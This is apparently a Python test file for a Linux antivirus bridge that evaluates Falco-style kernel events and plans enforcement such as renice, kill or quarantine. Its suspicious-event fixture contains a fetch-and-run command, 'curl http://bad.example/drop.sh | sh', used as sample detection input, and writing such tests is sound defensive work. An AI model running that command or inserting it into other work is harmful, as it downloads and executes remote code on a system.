from agents.linux_enforcement_backends import BackendApplyResult, EnforcementAction
from agents.linux_enforcement_hooks import LinuxEnforcementHooks
from agents.linux_kernel_event_bridge import LinuxKernelAntivirusBridge


def _clean_event() -> dict:
    return {
        "hostname": "node-a",
        "output_fields": {
            "evt.type": "execve",
            "proc.pid": 123,
            "proc.name": "bash",
            "proc.pname": "sh",
            "proc.cmdline": "bash -lc 'echo ok'",
            "proc.exepath": "/usr/bin/bash",
            "file.sha256": "a" * 64,
            "scbe.signer_trusted": True,
            "scbe.geometry_norm": 0.05,
        },
    }


def _suspicious_event() -> dict:
    return {
        "hostname": "node-z",
        "output_fields": {
            "evt.type": "finit_module",
            "proc.pid": 999,
            "proc.name": "bash",
            "proc.pname": "python",
            "proc.cmdline": "curl http://bad.example/drop.sh | sh",
            "proc.exepath": "/tmp/drop.sh",
            "file.sha256": "",
            "scbe.signer_trusted": False,
            "scbe.geometry_norm": 0.97,
        },
    }


def test_allow_action_has_no_enforcement_commands():
    bridge = LinuxKernelAntivirusBridge()
    decision = bridge.evaluate_falco_event(_clean_event())

    hooks = LinuxEnforcementHooks()
    plan = hooks.handle(decision)

    assert plan.kernel_action == "ALLOW"
    assert plan.commands == tuple()
    assert plan.applied is False
    assert plan.failures == tuple()


def test_suspicious_action_emits_linux_commands():
    bridge = LinuxKernelAntivirusBridge()
    decision = bridge.evaluate_falco_event(_suspicious_event())

    hooks = LinuxEnforcementHooks(quarantine_dir="/var/quarantine/scbe")
    plan = hooks.handle(decision)

    assert plan.kernel_action in {"THROTTLE", "QUARANTINE", "KILL", "HONEYPOT"}
    assert len(plan.commands) >= 1

    if plan.kernel_action == "THROTTLE":
        assert plan.commands[0].startswith("renice +10 -p")
    elif plan.kernel_action == "KILL":
        assert plan.commands[0].startswith("kill -KILL")
    else:
        assert plan.commands[0].startswith("kill -STOP")


def test_cooldown_suppresses_duplicate_enforcement_for_same_process():
    bridge = LinuxKernelAntivirusBridge()
    decision = bridge.evaluate_falco_event(_suspicious_event())

    fake_now = [100.0]

    def _now() -> float:
        return fake_now[0]

    hooks = LinuxEnforcementHooks(cooldown_seconds=60.0, now_fn=_now)

    first = hooks.handle(decision)
    second = hooks.handle(decision)

    assert first.cooldown_skipped is False
    assert second.cooldown_skipped is True
    assert second.commands == tuple()


class _RecordingBackend:
    name = "recording"

    def __init__(self):
        self.calls: list[tuple[EnforcementAction, bool]] = []

    def apply(self, action: EnforcementAction, *, dry_run: bool) -> BackendApplyResult:
        self.calls.append((action, dry_run))
        return BackendApplyResult(
            backend=self.name,
            applied=(not dry_run),
            details=("recorded",),
        )


class _FailingBackend:
    name = "failing"

    def apply(self, action: EnforcementAction, *, dry_run: bool) -> BackendApplyResult:
        return BackendApplyResult(
            backend=self.name,
            applied=(not dry_run),
            failures=("backend failed",),
        )


def test_apply_enforcement_dispatches_structured_action_to_backends():
    bridge = LinuxKernelAntivirusBridge()
    decision = bridge.evaluate_falco_event(_suspicious_event())
    backend = _RecordingBackend()
    hooks = LinuxEnforcementHooks(
        apply_enforcement=True,
        backends=(backend,),
        quarantine_dir="/var/quarantine/scbe",
    )

    plan = hooks.handle(decision)

    assert len(backend.calls) == 1
    action, dry_run = backend.calls[0]
    assert dry_run is False
    assert action.pid == decision.kernel_event.pid
    assert action.kernel_action == decision.result.kernel_action
    assert action.process_key == plan.process_key
    assert plan.backend_names == ("recording",)
    assert plan.backend_details == ("recorded",)
    assert plan.applied is True


def test_dry_run_mode_does_not_call_backends():
    bridge = LinuxKernelAntivirusBridge()
    decision = bridge.evaluate_falco_event(_suspicious_event())
    backend = _RecordingBackend()
    hooks = LinuxEnforcementHooks(apply_enforcement=False, backends=(backend,))

    plan = hooks.handle(decision)

    assert backend.calls == []
    assert plan.dry_run is True
    assert plan.applied is False


def test_backend_failures_are_collected():
    bridge = LinuxKernelAntivirusBridge()
    decision = bridge.evaluate_falco_event(_suspicious_event())
    hooks = LinuxEnforcementHooks(apply_enforcement=True, backends=(_FailingBackend(),))

    plan = hooks.handle(decision)

    assert plan.applied is True
    assert plan.failures == ("backend failed",)
